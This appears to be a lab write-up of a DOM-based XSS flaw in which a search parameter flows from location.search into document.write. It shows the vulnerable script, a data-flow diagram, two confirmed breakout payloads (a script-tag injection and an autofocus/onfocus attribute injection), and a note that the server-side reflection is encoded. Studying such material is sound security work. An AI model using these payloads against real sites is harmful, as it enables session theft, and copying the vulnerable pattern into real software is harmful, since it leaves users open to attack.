# Attack Chain — DOM XSS via document.write(location.search)

## The vulnerable code (as served verbatim to every client)
```html
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```

## Data flow
```
Victim URL          ?search="><script>alert(1)</script>
   │
   ▼
[SOURCE] window.location.search        -> ...?search=%22%3E%3Cscript%3E...
   │
   ▼
new URLSearchParams(...).get('search') -> query = `"><script>alert(1)</script>`   (decoded once)
   │
   ▼
[SINK] document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">')
   │   writes raw HTML string into the document at parse time
   ▼
[TRUST BOUNDARY CROSSED] the HTML parser interprets the written string as MARKUP:
   <img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>">
                                                        └──────────────────┘ executes
   ▼
RESULT: script runs in app origin with victim's cookies/context
```

## The two working breakout vectors (both CONFIRMED in a real parser)

### Vector 1 — close attribute + close tag + new script element
Payload:
```
"><script>alert(1)</script>
```
Written HTML (`"` closes `src`, `>` closes `<img>`, then a fresh `<script>` element):
```
<img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>">
```
Notes:
- `document.write` of a `<script>` during parsing **does execute** (legacy HTML spec
  behavior; the written tokens are inserted into the insertion point and the script runs).
- The trailing `">` is parsed as stray text in body — harmless.

### Vector 2 — attribute injection into the SAME element (event handler)
Payload:
```
" autofocus onfocus=alert(1) x="
```
Written HTML (`"` closes `src`, new attributes added; that `x="` swallows the original
closing quote so the tag stays well-formed):
```
<img src="/resources/images/tracker.gif?searchTerms=" autofocus onfocus=alert(1) x="">
```
`autofocus onfocus` fires on element focus without interaction.
Proven with `onfocus=document.title='ATTRFIRE'`.

Both vectors require escaping the **double-quoted attribute**, so the mandatory breakout
prefix is `"` (+ `>` for the tag-close/script route).

## Expected response sequence (verified)
1. `GET /?search=<anything>` → 200; page contains the inline sink script verbatim
   (server performs NO processing of search in the JS; it only decodes URL once).
2. Browser executes the inline script; `document.write` injects `<img ...>` + payload.
3. Payload markup is parsed and the Script runs (or the img event handler fires).

## Server-side note (the red herring)
The same `search` value is ALSO reflected server-side in `<h1>0 search results for '…'</h1>`
— but that reflection is HTML-encoded (`&quot; &apos; &lt; &gt;`), so the SSR path is
safe. Only the DOM path is exploitable. The vulnerability is invisible in static responses:
`snippet` appears identical for a benign and a malicious query.